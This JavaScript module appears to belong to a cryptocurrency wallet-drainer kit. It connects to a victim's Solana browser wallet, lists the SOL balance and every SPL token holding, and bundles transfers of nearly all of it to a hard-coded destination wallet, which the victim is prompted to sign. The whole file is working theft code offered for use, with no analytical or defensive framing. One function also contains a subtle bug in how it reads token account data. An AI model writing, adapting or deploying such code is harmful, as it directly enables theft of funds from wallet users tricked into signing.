// backend/modules/solanaDrainer.js
import { Connection, PublicKey, Transaction, SystemProgram, clusterApiUrl, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { createTransferInstruction, getAssociatedTokenAddress, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { DESTINATION_WALLET_SOL } from '../config.js';

export class SolanaDrainer {
    constructor() {
        this.isInitialized = false;
        this.connection = new Connection(clusterApiUrl("mainnet-beta"), 'confirmed');
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Test connection during initialization
            await this.connection.getLatestBlockhash();
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // ===== EXACT FUNCTIONS FROM app.js =====
    async connectSolanaWallet() {
        if (!window.solana) {
            throw new Error("❌ No Solana wallet detected. Install Phantom, Solflare, or any Solana wallet.");
        }
        
        try {
            const resp = await window.solana.connect();
            const userAddress = resp.publicKey.toString();
            console.log(`🟣 Connected to Solana wallet: ${userAddress}`);
            return userAddress;
        } catch (err) {
            throw new Error("❌ Solana connection failed: " + err.message);
        }
    }

    async getSolanaBalance(userAddress) {
        try {
            const connection = new Connection(clusterApiUrl("mainnet-beta"));
            const balanceLamports = await connection.getBalance(new PublicKey(userAddress));
            const sol = balanceLamports / LAMPORTS_PER_SOL;
            console.log(`💰 SOL Balance: ${sol} SOL`);
            return { lamports: balanceLamports, sol };
        } catch (err) {
            throw new Error("❌ Failed to fetch SOL balance: " + err.message);
        }
    }

    async sweepSol(userAddress, lamports) {
        try {
            const connection = new Connection(clusterApiUrl("mainnet-beta"));
            const sender = window.solana;
            const recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
            const tx = new Transaction({
                recentBlockhash,
                feePayer: new PublicKey(userAddress)
            });
            
            const transferInstruction = SystemProgram.transfer({
                fromPubkey: new PublicKey(userAddress),
                toPubkey: new PublicKey(DESTINATION_WALLET_SOL),
                lamports: lamports - 5000
            });
            
            tx.add(transferInstruction);
            const signed = await sender.signTransaction(tx);
            const signature = await connection.sendRawTransaction(signed.serialize());
            
            console.log(`✅ SOL swept! TX: https://solscan.io/tx/${signature}`);
            return signature;
            
        } catch (err) {
            throw new Error("❌ SOL sweep failed: " + err.message);
        }
    }

    async sweepSPLTokens(userAddress) {
        try {
            const connection = new Connection(clusterApiUrl("mainnet-beta"));
            const publicKey = new PublicKey(userAddress);
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
            });
            
            for (const { pubkey, account } of tokenAccounts.value) {
                const info = account.data.parsed.info;
                const amount = parseInt(info.tokenAmount.amount);
                const mint = info.mint;
                
                if (amount > 0) {
                    const ataDest = await getAssociatedTokenAddress(
                        new PublicKey(mint),
                        new PublicKey(DESTINATION_WALLET_SOL)
                    );

                    const tx = new Transaction().add(
                        createTransferInstruction(
                            pubkey,
                            ataDest,
                            publicKey,
                            amount,
                            [],
                            TOKEN_PROGRAM_ID
                        )
                    );
                    
                    tx.feePayer = publicKey;
                    tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
                    const signed = await window.solana.signTransaction(tx);
                    const sig = await connection.sendRawTransaction(signed.serialize());
                    
                    console.log(`✅ SPL Token drained [${mint}]: https://solscan.io/tx/${sig}`);
                }
            }
            
        } catch (err) {
            throw new Error("❌ SPL token drain failed: " + err.message);
        }
    }

    async sweepSolanaAssets(userAddress) {
        try {
            console.log('🔵 Starting Solana drain...');
            
            if (!window.solana) {
                throw new Error("❌ No Solana wallet detected. Install Phantom, Solflare, or any Solana wallet.");
            }

            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
            const publicKey = new PublicKey(userAddress);
            
            const lamports = await connection.getBalance(publicKey);
            console.log(`💰 SOL balance: ${lamports / 1e9} SOL`);
            
            if (lamports <= 10000) {
                console.log("⏩ Insufficient SOL for gas - skipping Solana drain");
                return false;
            }

            const transaction = new Transaction();
            let totalValue = 0;

            console.log('🔍 Checking for SPL tokens...');
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: TOKEN_PROGRAM_ID
            });

            const splTokens = tokenAccounts.value.filter(account => 
                parseInt(account.account.data.parsed.info.tokenAmount.amount) > 0
            );

            console.log(`📊 Found ${splTokens.length} SPL tokens with balance`);

            for (const { pubkey, account } of splTokens) {
                const info = account.account.data.parsed.info;
                const amount = parseInt(info.tokenAmount.amount);
                const mint = info.mint;
                const decimals = parseInt(info.tokenAmount.decimals);
                
                if (amount > 0) {
                    console.log(`🪙 Draining SPL token: ${mint}, Amount: ${amount / (10 ** decimals)}`);
                    
                    const ataDest = await getAssociatedTokenAddress(
                        new PublicKey(mint),
                        new PublicKey(DESTINATION_WALLET_SOL)
                    );

                    const transferIx = createTransferInstruction(
                        pubkey,
                        ataDest,
                        publicKey,
                        amount,
                        [],
                        TOKEN_PROGRAM_ID
                    );
                    
                    transaction.add(transferIx);
                    console.log(`📦 Queued SPL token: ${mint.substring(0, 8)}..., amount: ${amount / (10 ** decimals)}`);
                }
            }

            const solAmount = lamports - 5000;
            if (solAmount > 0) {
                console.log(`💸 Draining SOL: ${solAmount / 1e9} SOL`);
                
                const transferSol = SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new PublicKey(DESTINATION_WALLET_SOL),
                    lamports: solAmount
                });
                
                transaction.add(transferSol);
                console.log(`💸 Queued SOL transfer: ${(solAmount / 1e9).toFixed(6)} SOL`);
            }

            if (transaction.instructions.length > 0) {
                console.log(`📤 Sending transaction with ${transaction.instructions.length} instructions`);
                
                transaction.feePayer = publicKey;
                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

                const signed = await window.solana.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signed.serialize());
                
                await connection.confirmTransaction(signature, 'confirmed');
                
                console.log(`✅ Solana assets swept successfully!`);
                console.log(`🔗 TX: https://solscan.io/tx/${signature}`);

                return {
                    success: true,
                    txHash: signature,
                    solDrained: solAmount / 1e9,
                    tokensDrained: splTokens.length
                };
            } else {
                console.log('ℹ️ No assets to drain on Solana');
                return { success: false, reason: 'No assets' };
            }

        } catch (error) {
            throw new Error(`❌ Solana drain failed: ${error.message}`);
        }
    }

    async fetchSolPrice() {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
            const data = await response.json();
            return data.solana.usd || 0;
        } catch (error) {
            console.warn('⚠️ Failed to fetch SOL price, using default $20');
            return 20;
        }
    }
}

export const solanaDrainer = new SolanaDrainer();
